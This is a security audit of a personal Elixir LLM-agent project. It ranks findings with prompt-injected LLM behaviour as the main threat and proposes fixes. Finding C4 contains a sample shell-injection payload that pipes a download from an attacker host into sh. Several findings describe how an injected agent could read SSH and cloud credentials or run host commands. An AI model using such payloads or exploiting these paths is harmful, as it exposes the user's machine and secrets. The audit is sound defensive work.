# Codebase Audit

**Date:** 2026-05-16
**Scope:** Full audit of `lib/` (338 modules, ~52K LOC) across architecture, security, agent/tools, testing, and config/build hygiene.
**Method:** Five parallel read-only audits, then re-scored against the actual threat model.

## Threat model (used for severity re-scoring)

JidoClaw is a single-user personal project, not distributed, not internet-facing, only ever reachable over a Tailscale network. Severities below are scored against:

- **Primary adversary:** the LLM itself, via prompt injection (browsed web content, untrusted file contents in context), hallucination, or model error.
- **Secondary adversary:** accidental leakage — secrets ending up in screenshots, screen-shares, backups, cloud sync, or upstream LLM provider logs.
- **Operational concerns:** reliability, maintainability, drift between code and prompts.

Findings that only matter against an external network attacker are dropped or marked DEPRIORITIZED. Findings the LLM can trigger against the user's own machine are kept HIGH/CRITICAL even though they previously looked like "internal-only".

## TL;DR

- **5 CRITICAL** items, all in the "LLM-can-hurt-the-user" or "secret-exfiltration-via-LLM-context" categories.
- **9 HIGH** items split between LLM-misbehavior surfaces and OTP/reliability bugs that will cost debugging time.
- **~15 MEDIUM** items: drift, hygiene, supply chain, tool consistency.
- **~10 deprioritized** items that were rated higher in the raw audit but only matter for distributed / internet-facing deployments.

The single highest-leverage fix is adding a path-jail to the VFS resolver — it closes three different LLM-driven exfiltration paths at once.

---

## CRITICAL — LLM can hurt the user's machine or exfil secrets

### C1. Tool outputs are never redacted before going to the LLM

**Where:** all of `lib/jido_claw/tools/`; `Patterns.redact/1` is referenced exactly once in `lib/jido_claw/tools/store_solution.ex:11` (as a moduledoc comment, not a call).

**What:** Tool results flow straight from the host into the model's next request:

- `lib/jido_claw/tools/read_file.ex:54-66` returns raw file bytes.
- `lib/jido_claw/tools/git_diff.ex:33-41` returns up to 15 KB of diff verbatim.
- `lib/jido_claw/tools/search_code.ex:36-49` returns raw grep matches.
- `lib/jido_claw/tools/run_command.ex:241,248-252` returns raw stdout/stderr.
- `lib/jido_claw/tools/browse_web.ex:86-141` returns raw page content and base64 screenshots.

Persistence does redact: `lib/jido_claw/conversations/tool_transcript.ex:19-23` calls `Transcript.redact/1`. But the value returned from `Tools.X.run/2` to the agent loop — and forwarded upstream — is never scrubbed.

**Why it matters here:** If the agent ever `read_file(".env")`, `git_diff`s a commit that briefly contained a key, or `search_code`s the project for `AWS_SECRET`, the raw secrets land in the next message sent to Anthropic / OpenAI / whoever, regardless of how locked-down the network is. This is the leakage surface a tailnet cannot mitigate.

---

### C2. `Forge.Sandbox.Local` is `sh -c` as the host user

**Where:** `lib/jido_claw/forge/sandbox/local.ex:14-56, 117-138`.

**What:** `Local.create/1` makes a temp dir; `Local.exec/3` runs `System.cmd("sh", ["-c", command], cd: sandbox.dir, env: env, stderr_to_stdout: true)`. No cgroups, namespaces, seccomp, chroot, user separation, network restriction, or filesystem boundary. `write_file/3` and `read_file/3` (lines 117-138) accept absolute paths verbatim — `String.starts_with?(path, "/") -> path`. This is the **default** when `FORGE_SANDBOX != docker`.

**Why it matters here:** An LLM that lands on a prompt-injecting web page (via `browse_web`) and gets told to "run this helpful cleanup script" executes it against `$HOME`. The word "sandbox" in the module name is actively misleading — a future reader (you, in six months) will assume there's a boundary that isn't there.

---

### C3. VFS resolver has no path-jail; LLM can read `~/.ssh/id_rsa`

**Where:** `lib/jido_claw/vfs/resolver.ex:276-287`.

**What:** Any path that doesn't start with `github://` / `s3://` / `git://` and doesn't match a workspace mount falls through to `{:local, path}` and then to plain `File.read(local_path)` / `File.write(local_path, content)`. MCP tools pass a default scope with `project_dir: File.cwd!()` but the resolver never enforces that paths stay under it. `Path.expand` is not applied; `..` traversal is not blocked; symlinks are followed.

**Exploit path:** LLM picks `read_file("/Users/rickdunkin/.ssh/id_rsa")` or `read_file("~/.aws/credentials")` — the resolver returns the bytes, which then flow into the next model request (combine with C1 above).

**Why it matters here:** This is the path that exfils long-lived host secrets into upstream model provider logs.

---

### C4. Command injection in `:git_repo` resource provisioning

**Where:** `lib/jido_claw/forge/resource_provisioner.ex:152-165`.

**What:**
```elixir
clone_cmd = "git clone"
clone_cmd = if branch, do: "#{clone_cmd} --branch #{branch}", else: clone_cmd
clone_cmd = "#{clone_cmd} #{source} #{mount_path}"
case Sandbox.exec(client, clone_cmd) do
```

`source`, `branch`, and `mount_path` are interpolated into a shell string handed to `Sandbox.exec`, which always routes through `sh -c`. No quoting, no argument-list form.

**Exploit path:** A resource spec with `source: "x; curl http://attacker | sh"` executes the embedded command. The LLM is the realistic source of malicious specs — even when not adversarial, hallucinated paths with metacharacters trigger this. Under the default Local "sandbox" (C2), this is RCE on the host.

---

### C5. `get_agent_result` masks every failure as `{:ok, _}`

**Where:** `lib/jido_claw/tools/get_agent_result.ex:34-56`.

**What:** Every branch returns `{:ok, %{status: "completed" | "still_running" | "failed" | "error", ...}}`. The only `{:error, _}` return is the trivial "no such agent" case at line 30. Worker exceptions, 120s timeouts, protocol errors — all surface as `{:ok, %{status: "..."}}`.

**Why it matters here:** ReAct loops see `{:ok, _}` and move on without retrying or escalating. The multi-agent control flow you presumably built around `spawn_agent` → `get_agent_result` is fundamentally broken in the failure paths, but appears to work in tests because the success path returns the same shape. This is the single most agent-confusing tool in the suite.

---

## HIGH — LLM misbehavior or reliability

### H1. Forge.Harness spawns iteration Task without monitoring

**Where:** `lib/jido_claw/forge/harness.ex:365-373`.

**What:** `Task.Supervisor.start_child` runs the iteration body and casts back `:iteration_complete`. The harness does **not** `Process.monitor` the task pid. If the task raises, throws, or exits, the cast never happens. The caller's `GenServer.call(pid, msg, 300_000)` hangs the full 5-minute timeout, then exits — and the harness state is wedged in `:running` forever (`restart: :temporary` means no automatic recovery).

**Fix:** monitor the pid; treat `{:DOWN, ref, _, _, reason}` as iteration failure.

---

### H2. Forge.Harness has no catch-all `handle_info/2`

**Where:** `lib/jido_claw/forge/harness.ex:173, 221, 267, 310`.

**What:** Only four `handle_info` clauses (`:provision`, `:bootstrap`, `:init_runner`, `{:recover, _}`). Any stray DOWN, EXIT, telemetry-pipe delivery, or PubSub message crashes the harness with `FunctionClauseError`. Since the harness is `restart: :temporary`, the session is permanently dead and the user has to rerun.

**Fix:** add a catch-all `def handle_info(_msg, state), do: {:noreply, state}` at the bottom.

---

### H3. `send_to_agent` template lookup silently misroutes multi-word workers

**Where:** `lib/jido_claw/tools/send_to_agent.ex:29-32`.

**What:**
```elixir
template_name = params.agent_id |> String.split("_") |> List.first()
```

`spawn_agent.ex:42` generates ids like `docs_writer_12345`. `List.first/1` returns `"docs"`, `Templates.get("docs")` fails, and the code falls through to `JidoClaw.Agent.ask_sync` (the **main** agent), not the actual worker. Affects `docs_writer` and `test_runner` — every message sent to those workers goes to the wrong process.

**Fix:** register the template name on the agent tracker when spawning; look it up by id rather than parsing the id.

---

### H4. `Platform.Approval` uses `:private` ETS but reads from caller process

**Where:** `lib/jido_claw/platform/approval.ex:55, 138-144`.

**What:** `:ets.new(:jido_claw_tool_approvals, [:set, :private])` makes a private table only the GenServer owner can read. `allowed?/2` is called from `check/3` in the caller's process; `:ets.lookup` raises `:badarg`; the function catches it and returns `false`. Net effect: every `on_miss` check returns "not allowed" and triggers an approval request — making approvals behave as `:always` mode silently.

**Fix:** change the table to `:protected` (owner writes, anyone reads) and use a named table so callers don't need to know the pid.

---

### H5. `search_code` runs host `grep` against any path, bypassing VFS

**Where:** `lib/jido_claw/tools/search_code.ex:34-36`.

**What:**
```elixir
args = Enum.concat([["-rn", "--color=never"], glob_args, [pattern, path]])
case System.cmd("grep", args, stderr_to_stdout: true) do
```

`path` defaults to `"."` but the schema accepts any string with no validation. `tool_context.project_dir` is not read; `path` is not constrained against escaping. An LLM `search_code(pattern: "AWS_SECRET", path: "/")` walks the host filesystem and returns matches into context (then upstream via C1).

**Fix:** route through `JidoClaw.VFS.Resolver`; reject paths outside `project_dir` unless they're a known workspace mount.

---

### H6. Sandbox `write_file` / `read_file` accept absolute paths

**Where:** `lib/jido_claw/forge/sandbox/local.ex:123, 135` and `lib/jido_claw/forge/sandbox/docker.ex:225-231`.

**What:** Both backends include the same pattern: `if String.starts_with?(path, "/"), do: path, else: Path.join(workspace_dir, path)`. The "sandbox" only applies to relative paths; an LLM can address `/etc/...` or `/Users/...` directly. Same exfil-write class as C3.

**Fix:** always join with workspace_dir; reject absolute paths or strip the leading `/`.

---

### H7. `run_command` host fallback runs raw `sh -c`

**Where:** `lib/jido_claw/tools/run_command.ex:233-246`.

**What:** When `JidoClaw.Shell.SessionManager` isn't running (boot race, supervisor crash window), `run_with_system_cmd/2` does `System.cmd("sh", ["-c", command], ...)` with no validation, no allowlist, no denylist. The SessionManager path has a small VFS-tier allowlist (`~w(cat ls cd pwd mkdir rm cp echo write env bash)` in `session_manager.ex:1080-1109`) but everything else routes to host shell unchanged anyway.

**Fix:** drop the bare-`sh -c` fallback; require SessionManager (it's supervised and should always be up). Optionally add a denylist of obviously-destructive command patterns even on the happy path.

---

### H8. `git_commit` ignores `git add` exit status; omits `--`

**Where:** `lib/jido_claw/tools/git_commit.ex:25-39`.

**What:**
```elixir
Enum.each(files, fn file ->
  System.cmd("git", ["add", file], stderr_to_stdout: true)
end)
case System.cmd("git", ["commit", "-m", message], stderr_to_stdout: true) do
```

If one `git add` fails (typo, path outside repo, ignored), the failure is dropped and the commit proceeds with whatever was previously staged. Also: no `--` separator between args and paths, so a path like `--exec=cmd` is interpreted as a flag (older git versions had `git add` flag-injection CVEs along these lines).

**Fix:** check each `git add` return; insert `--` before the paths.

---

### H9. Six Jido deps pinned to `main` branch

**Where:** `mix.lock:75, 77-79, 81-82` and `mix.exs:134, 136, 138-140`.

**What:** `jido_mcp`, `jido_skill`, `jido_messaging`, `jido_shell`, `jido_vfs`, `jido_chat` are all `branch: "main"`. `libgraph` is also git-pinned to a fork. Every `mix deps.update` pulls whatever lands on those branches with no version review.

**Why it matters here:** Supply-chain risk is unaffected by the tailnet. A malicious or accidentally-broken commit on `agentjido/jido_*` runs with your credentials, your shell, your filesystem at next update. This is the most likely real-world compromise path for a personal-machine setup.

**Fix:** pin to commit SHAs in `mix.lock`, or vendor under your own GitHub org and pin to tags.

---

## MEDIUM — drift, hygiene, maintainability

### M1. Cloak vault key hardcoded in `config.exs`, not gitignored

**Where:** `config/config.exs:269-271`:
```elixir
key: Base.decode64!("dGhpc19pc19hX2Rldl9vbmx5X2tleV8zMl9ieXRlcw==")
# decodes to literal string "this_is_a_dev_only_key_32_bytes"
```
`runtime.exs:29-36` overrides only when `CLOAK_KEY` is set in the env.

**Why re-scored MEDIUM:** External attackers aren't the concern, but laptop loss, Time Machine backups, accidental cloud sync, or screen-shares of `config.exs` all leak the key. Without the key, the encrypted DB columns are noise; with it, they're plaintext.

**Fix:** require `CLOAK_KEY` (no fallback). Store the value in your password manager or in a gitignored `~/.config/jidoclaw/cloak.key`. Add a `JidoClaw.Application.start/2` assertion that refuses to boot if it's missing.

---

### M2. `LogRedactor` is defined but never installed

**Where:** `lib/jido_claw/security/redaction/log_redactor.ex:1-16` defines a `:logger` filter callback; nothing calls `Logger.add_handlers` / `:logger.add_handler` anywhere in `lib/` or `config/`.

**Why re-scored MEDIUM:** Log lines screenshotted or pasted into a chat / issue tracker are the leak path on a personal box. Five-minute fix.

**Fix:** add `:logger.add_handler_filter(:default, :redact_secrets, {&LogRedactor.filter/4, []})` at app start (or wire it via `config :logger`).

---

### M3. `spawn_agent` has no enforced depth/breadth limit

**Where:** `lib/jido_claw/tools/spawn_agent.ex:39-89` and `lib/jido_claw/agent_tracker.ex` (no cap consulted).

**What:** Workers don't include `SpawnAgent` in their tool list today, so depth is bounded at 1 by accident. There's no programmatic enforcement. `AgentTracker.child_count/0` exists but is never read by `spawn_agent`.

**Why it matters here:** An LLM hallucinating its way into a spawn-loop eats your RAM. One config-change away from infinite recursion.

**Fix:** read `AgentTracker.child_count/0` and reject with `{:error, :max_children}` past a configurable cap. Make worker depth explicit, not accidental.

---

### M4. `spawn_agent` IDs collide in cluster mode

**Where:** `lib/jido_claw/tools/spawn_agent.ex:42`:
```elixir
tag = Map.get(params, :tag) || "#{template_name}_#{:erlang.unique_integer([:positive])}"
```

`unique_integer` is per-BEAM-node. Network mode (`network_share` / `network_status` imply multi-node) will collide IDs across nodes.

**Fix:** prefix with `node()` or use a UUID; check `AgentTracker` for existing id before `start_agent`.

---

### M5. `edit_file` is not atomic

**Where:** `lib/jido_claw/tools/edit_file.ex:57-67`.

**What:** Writes the new content directly via `Resolver.write/3`. No tmp-file + rename like `prompt.ex:394-401` uses. A crash mid-write truncates the file with no rollback.

**Fix:** route writes through an `atomic_write` helper (write to `path <> ".tmp"`, then `File.rename!/2`).

---

### M6. `write_file` has no size cap

**Where:** `lib/jido_claw/tools/write_file.ex:22-29`. Schema accepts unbounded `content`. `edit_file` similarly accepts unbounded `old_string` / `new_string`.

**Why it matters here:** An LLM hallucinating a 5GB generated file writes 5GB to disk before failing.

**Fix:** cap content at e.g. 5 MB; reject at the schema level.

---

### M7. git tools ignore `tool_context.project_dir`

**Where:** `lib/jido_claw/tools/git_status.ex:19-26`, `git_diff.ex:32`, `git_commit.ex:28-31`, `project_info.ex:28,42,49,57`.

**What:** All four run `System.cmd("git", ...)` in `File.cwd!` — the BEAM's startup directory — not in the resolved project_dir. `read_file` / `write_file` / `list_directory` / `run_command` correctly thread `project_dir`; the git family does not.

**Why it matters here:** Lower-stakes than the exfil findings since you're the only tenant, but you'll absolutely get bitten the first time you have two projects open and `git_status` shows the wrong one.

**Fix:** add `cd: tool_context.project_dir || File.cwd!()` to the `System.cmd` options in all four.

---

### M8. `system_prompt.md` drift: registered tools vs documented tools

**Where:** `priv/defaults/system_prompt.md:11` (the heading) and `lib/jido_claw/tools/`.

**What:** Heading says "29 tools"; `lib/jido_claw/tools/` has 31 `.ex` files. `forget` is registered in `lib/jido_claw/agent/agent.ex:30` but never mentioned in the prompt's "Memory (2 tools)" section. The active `.jido/system_prompt.md` is committed alongside a `.bak` of identical content; the source of truth is unclear.

**Why it matters here:** The model can't use a tool it doesn't know exists. Drift will only grow.

**Fix:** generate `system_prompt.md` from a script that introspects `agent.ex`. Drop the `.bak`. Decide whether `.jido/system_prompt.md` or `priv/defaults/system_prompt.md` is canonical and add a precommit / CI check that they match.

---

### M9. Worker `max_iterations` doesn't match `Templates` registry

**Where:** `lib/jido_claw/agent/templates.ex:9-52` vs `lib/jido_claw/agent/workers/*.ex`.

**What:** `Templates.get("coder")` advertises `max_iterations: 25`. `Workers.Coder` (`workers/coder.ex:21`) hard-codes `15`. `spawn_agent` doesn't pass an override, so the worker's bake-in wins. The metadata is unused.

**Fix:** either honor `Templates` at spawn time (preferred — single source of truth) or delete the field from the registry.

---

### M10. Error shapes are inconsistent across tools

**Where:** across `lib/jido_claw/tools/`.

**What:** The agent loop sees a mix of:
- String tuples (`{:error, "Cannot read..."}`)
- Bare atoms (`{:error, :id_or_label_required}`)
- Nested tuples (`{:error, {:source_not_invalidatable, source}}`)
- `inspect`-blobbed strings (`{:error, "Failed to spawn agent: #{inspect(reason)}"}`)
- Faked successes (`{:ok, %{status: "failed", error: ...}}` — see C5)

**Fix:** standardize on `{:error, %{code: atom, message: String.t(), details: map}}` (or similar). One pattern, every tool.

---

### M11. Output truncation thresholds are inconsistent

**Where:** various tools.

| Tool | Cap |
|------|-----|
| `run_command.ex:77` | 10 KB |
| `git_diff.ex:35` | 15 KB |
| `browse_web.ex:34` | 10.2 KB |
| `search_code.ex:17,39` | 50 lines (no byte cap) |
| `read_file.ex:30` | 2000 lines (no byte cap) |
| `list_directory.ex:32` | 200 entries (no byte cap) |

A 50-line grep over a minified JS file, or a `read_file` of a generated bundle, can dump tens of MB into context.

**Fix:** add a uniform byte cap (e.g. 32 KB) at the tool-output layer in addition to per-tool line/entry caps.

---

### M12. `MCPScope.wrap` applied to ~16 of 30 tools

**Where:** transcript wiring at `lib/jido_claw/tools/mcp_scope.ex` and tool call sites.

**What:** Agent management, reasoning, and memory tools (`recall`, `remember`, `forget`, `spawn_agent`, `send_to_agent`, `kill_agent`, `list_agents`, `reason`, `run_pipeline`, `schedule_task`, `unschedule_task`, `verify_certificate`, etc.) skip `MCPScope.wrap`. Under MCP serve mode their calls don't appear in the conversation transcript table; `tool_context` defaulting also doesn't run.

**Fix:** wrap every tool, or none. Pick one. If wrapping every tool, push it into a `Jido.Action` plugin so it can't be forgotten.

---

### M13. Hardcoded `secret_key_base` and `token_signing_secret`

**Where:** `config/config.exs:200, 241`.

**What:** Both default to literal dev strings. `runtime.exs:46` overrides `secret_key_base` if env is set, but **`token_signing_secret` has no override path at all** — AshAuthentication tokens are signed with the literal `"jidoclaw_dev_token_signing_secret..."` always.

**Why re-scored MEDIUM:** Under the tailnet model, token forgery requires source-code access, which means you've already lost. Still worth fixing because the values are checked-in and screenshare-leakable.

**Fix:** require both via `runtime.exs` env vars; refuse to boot without them.

---

### M14. Root supervisor uses `:rest_for_one`

**Where:** `lib/jido_claw/application.ex:49`.

**What:** A crash in any of ~30 children inside `core_children/0` restarts every later child. E.g. `Memory.Consolidator.MCPServer` (Bandit HTTP) crash cascade-restarts `Skills`, `StrategyStore`, `PipelineStore`, `Network.Supervisor`, `AgentTracker`, `Display`, `VFS.WorkspaceSupervisor`, `ProfileManager`, `ServerRegistry`, `SessionManager`. Blast radius far exceeds actual dependencies.

**Fix:** split into independent supervisors with `:one_for_one` siblings; use `:rest_for_one` only where there's a real start-order dependency.

---

### M15. `JidoClaw.Heartbeat` is unsupervised

**Where:** `lib/jido_claw/cli/repl.ex:290`: `_ = JidoClaw.Heartbeat.start_link(project_dir: project_dir)`.

**What:** The heartbeat GenServer is started by the REPL process and is not in the supervision tree. A crash (disk full during `File.write!` at `lib/jido_claw/heartbeat.ex:105`) is uncaught.

**Fix:** add to `application.ex` `core_children` with `restart: :transient`.

---

### M16. No release artifacts; no automated migration path

**Where:** absence — no Dockerfile, no `rel/`, no `:releases` in `mix.exs`, no `JidoClaw.Release.migrate/0`.

**What:** `grep -r Ecto.Migrator lib/` returns nothing. Migrations only apply via `mix ecto.migrate` interactively. 30 migrations exist.

**Why it matters here:** Not blocking today, but if you ever move this off your laptop to a home server / NAS / always-on box on the tailnet, this is the friction point.

**Fix:** add `lib/jido_claw/release.ex` with `migrate/0`; add a minimal `mix release` config. Defer until needed.

---

## DEPRIORITIZED — not your threat model

Listed for completeness; the original audit rated these higher but the tailnet/personal model makes them low-stakes:

- **Open registration + AshAdmin behind only "is-logged-in"** — no public registration endpoint exists; only you reach `/admin`.
- **Webhook signature gaps for `/webhooks/github`** — not exposed publicly.
- **CSRF / `Plug.MethodOverride`** — same.
- **`SetupLive` discloses which keys are configured** — only you see it.
- **`bcrypt_elixir` cost not pinned** — no remote password attackers.
- **`browse_web` SSRF to metadata IPs** — no AWS metadata endpoint on your LAN.
- **Tenant boundary leakage / multi-user data isolation** — single user.
- **Web layer test coverage gaps** — you'll notice breakage as the sole user.
- **`AshAdmin` mounted unconditionally** — convenience win for a personal tool.
- **`dev.exs` `show_sensitive_data_on_connection_error: true`** — only matters if `dev.exs` somehow ships to prod.

Revisit any of these only if you later expose JidoClaw beyond the tailnet (Funnel, port-forward, share with someone else).

---

## INFORMATIONAL — observations, not findings

- **Coverage:** 254 of 338 `lib/` modules have no test file (≈75% missing); realistic coverage rate ~40-50%. Most painful gaps: `lib/jido_claw/security/vault.ex` (no test), `lib/jido_claw/forge/sandbox/local.ex` (no test), `lib/jido_claw/forge/harness.ex` (1266 LOC GenServer, no state-machine tests), 19 of 31 tool modules untested, MCP server has only smoke tests (`test/jido_claw/mcp_server_test.exs` never calls `handle_request/2`).
- **Tautological tests:** `test/jido_claw/application_test.exs:80` (`assert :ok == (... || :ok)`) and `test/jido_claw/signal_bus_test.exs:105-128` (entire body wrapped in `try/rescue _ -> :ok end`) — neither can fail.
- **`Process.sleep` as a refute buffer:** `test/jido_claw/audit/ash_tracer_test.exs:99, 126, 153` and `test/jido_claw/forge/context_builder_test.exs:125, 251, 310`. Flaky under load.
- **Top 5 largest files** (likely refactor candidates): `cli/commands.ex` 1623, `shell/session_manager.ex` 1491, `forge/harness.ex` 1266, `memory/consolidator/run_server.ex` 1260, `memory/resources/fact.ex` 959.
- **`erl_crash.dump` (17 MB)** exists in the repo root. Gitignored, but worth deleting.
- **`.jido/system_prompt.md.bak`** is committed to git alongside the live file.
- **LLMDB model catalog** (`config.exs:7-149`) lists speculative-looking Ollama tags (`qwen3.5:35b`, `glm-4.7-flash`, `kimi-k2.5`, `nemotron-3-super:cloud`) that don't match canonical names.
- **`postgrex` is `>= 0.0.0`** (`mix.exs:190`) — only fully-unconstrained dep.
- **`ignore_module_conflict: true`** (`mix.exs:31`) silences all redefinitions globally, not just the 4 known patches.

---

## Suggested fix outline

Three rough phases. Inside each phase, items are listed roughly in dependency order; many of them are independent and can be done in any sequence.

### Phase 1 — Close the LLM exfil/destruction surface

Goal: an LLM with web access cannot read your home dir, can't run arbitrary commands as you, and can't ship secrets upstream.

1. **VFS path-jail.** In `lib/jido_claw/vfs/resolver.ex`, `Path.expand` every local path and require it to be `String.starts_with?(project_dir)` or under a known workspace mount. Reject everything else with `{:error, :path_outside_project}`. Closes **C3**, **H5**, **H6**.
2. **Redact tool outputs at the boundary.** Add a single hook (Jido plugin or wrapper around each tool's `run/2`) that pipes the result through `JidoClaw.Security.Redaction.Patterns.redact/1` before returning. Closes **C1**.
3. **Fix or rename `Forge.Sandbox.Local`.** Either delete `Local` and make Docker the only supported backend, or rename it to `Forge.Runner.HostShell` with a startup warning. Stops the implicit "sandbox" promise. Closes **C2**.
4. **Argument-list the `git_repo` provisioner.** In `lib/jido_claw/forge/resource_provisioner.ex:152-165`, replace string interpolation with `["clone", "--branch", branch, source, mount_path]` and a `Sandbox.exec` variant that takes an arg list (add one if it doesn't exist). Closes **C4**.
5. **Drop the `sh -c` host fallback in `run_command`.** Require SessionManager; if it's not up, return `{:error, :shell_unavailable}`. Closes **H7**.
6. **Cap `write_file` and `edit_file` content size.** 5 MB or whatever feels right. Add to the schema so Jido validates pre-call. Closes **M6**.
7. **Add a depth/breadth limit to `spawn_agent`.** Read `AgentTracker.child_count/0`; reject past a config-driven cap. Closes **M3**.
8. **Install `LogRedactor` as a `:logger` filter.** One config line. Closes **M2**.

### Phase 2 — Correctness and reliability

Goal: the agent loop's failure modes are observable, child workers actually receive messages, sub-agents can be debugged without grepping logs.

9. **`get_agent_result` returns `{:error, _}` on failure.** Distinguish `still_running` (legit `{:ok, %{status: :running}}`) from `failed`/`error` (return `{:error, %{...}}`). Closes **C5**.
10. **Fix `send_to_agent` template lookup.** When spawning, register the template name on `AgentTracker`; in `send_to_agent`, look up by id, don't split on `_`. Closes **H3**.
11. **Add catch-all `handle_info` + Task monitoring to `Forge.Harness`.** Both fixes are independent; do them together. Closes **H1**, **H2**.
12. **Fix `Platform.Approval` ETS.** Switch `:private` to `:protected`; verify approval flow does what the config says. Closes **H4**.
13. **Argument-list every shell-out + `--` for git.** Audit `git_*` tools, `run_command`, `forge/runners/*`. Add `--` between args and paths in `git add`. Closes **H8** and adjacent classes.
14. **Thread `project_dir` into git tools.** Add `cd:` to `System.cmd` in `git_status`, `git_diff`, `git_commit`, `project_info`. Closes **M7**.
15. **Atomic `edit_file`.** Tmp + rename. Closes **M5**.
16. **Standardize tool error shape.** Settle on `{:error, %{code: atom, message: String.t()}}`; convert tool by tool. Closes **M10**.
17. **Uniform output byte cap.** 32 KB ceiling at the result layer. Closes **M11**.
18. **Cluster-safe agent IDs.** Prefix `node()` or use UUID; check tracker for collision. Closes **M4**.

### Phase 3 — Hygiene and maintainability

Goal: less drift, less supply-chain risk, easier to come back to in six months.

19. **Pin Jido deps to commit SHAs.** Replace `branch: "main"` with `ref: "<sha>"` in `mix.exs` for `jido_mcp`, `jido_skill`, `jido_messaging`, `jido_shell`, `jido_vfs`, `jido_chat`, `libgraph`. Add a recurring "review and bump" cadence. Closes **H9**.
20. **Move `CLOAK_KEY` and `token_signing_secret` to env-only.** Delete from `config.exs`; require in `runtime.exs`; refuse to boot if missing. Store the actual key in your password manager. Closes **M1**, **M13**.
21. **Generate `system_prompt.md` from registered tools.** Add a `mix jidoclaw.gen.prompt` (or precommit) that reads `agent.ex` and emits the tool catalog. Delete `.jido/system_prompt.md.bak`. Pick the canonical file. Closes **M8**.
22. **Reconcile `Templates` `max_iterations` with worker bake-ins.** Either override at spawn or delete from the registry. Closes **M9**.
23. **Wrap every tool with `MCPScope.wrap` (via plugin).** Or drop it everywhere. Pick a side. Closes **M12**.
24. **Pin `postgrex`.** `~> 0.22` or similar.
25. **Audit `ignore_module_conflict: true`.** Either keep but add a `mix compile` plugin that allowlists the 4 known patches, or remove the global flag and use `@compile {:no_warn_undefined, ...}` per patch.
26. **Split the root supervisor.** Move heartbeat under it (**M15**), and break `:rest_for_one` into independent groups (**M14**). Lower priority — only revisit if you start seeing cascade restarts.
27. **Tests, when you touch the area:** add a `Vault` round-trip test, a `WebhookSignature` test, a `Forge.Sandbox.Local` (post-rename) test, and at least one MCP end-to-end integration test (`handle_request/2` → tool dispatch). No need to backfill everything at once.
28. **Release pathway, if/when you move off the laptop:** add `JidoClaw.Release.migrate/0`, a minimal `mix release` config, and a Dockerfile. Closes **M16**.

### Quick wins (one sitting each)

- Delete `erl_crash.dump` from the working tree.
- Delete `.jido/system_prompt.md.bak`.
- Pin `postgrex`.
- Fix the two tautological tests (`application_test.exs:80`, `signal_bus_test.exs:105-128`).
- Replace `Process.sleep` refute-buffers with telemetry or `assert_receive`.
- Install `LogRedactor` (M2 above).

---

## Appendix — files cited most often

| File | Findings |
|------|---------:|
| `lib/jido_claw/forge/harness.ex` | C2 (indirect), H1, H2 |
| `lib/jido_claw/vfs/resolver.ex` | C3 |
| `lib/jido_claw/forge/sandbox/local.ex` | C2, H6 |
| `lib/jido_claw/tools/get_agent_result.ex` | C5 |
| `lib/jido_claw/tools/send_to_agent.ex` | H3 |
| `lib/jido_claw/tools/search_code.ex` | H5 |
| `lib/jido_claw/tools/run_command.ex` | H7, M11 |
| `lib/jido_claw/tools/spawn_agent.ex` | M3, M4 |
| `lib/jido_claw/tools/git_commit.ex` | H8 |
| `lib/jido_claw/tools/edit_file.ex`, `write_file.ex` | M5, M6 |
| `config/config.exs` | M1, M13 |
| `priv/defaults/system_prompt.md` | M8 |
| `lib/jido_claw/agent/templates.ex` | M9 |
| `lib/jido_claw/platform/approval.ex` | H4 |
| `mix.exs`, `mix.lock` | H9, M misc |
| `lib/jido_claw/application.ex` | M14, M15 |
